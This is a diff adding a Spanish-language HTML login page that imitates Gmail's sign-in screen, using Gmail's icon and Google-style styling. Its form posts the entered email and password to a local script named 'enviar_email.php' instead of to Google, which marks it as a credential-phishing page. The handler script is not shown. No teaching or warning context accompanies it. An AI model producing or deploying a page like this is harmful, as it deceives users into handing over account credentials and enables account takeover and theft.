@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f2f2f2;
+        }
+
+        .login-container {
+            background: #fff;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        .login-container h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+        }
+
+        .button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .button:hover {
+            background-color: #1669c1;
+        }
+
+        .forgot-link {
+            color: #1a73e8;
+            font-size: 14px;
+            margin-top: 20px;
+            display: inline-block;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" alt="Logo de Gmail">
+        <h1>Iniciar sesión</h1>
+        <form action="enviar_email.php" method="post">
+            <input type="email" name="email" class="input-field" placeholder="Correo electrónico o teléfono" required>
+            <input type="password" name="password" class="input-field" placeholder="Contraseña" required>
+            <button type="submit" class="button">Siguiente</button>
+            <a href="#" class="forgot-link">¿Has olvidado tu correo electrónico?</a>
+        </form>
+    </div>
+</body>
+</html>
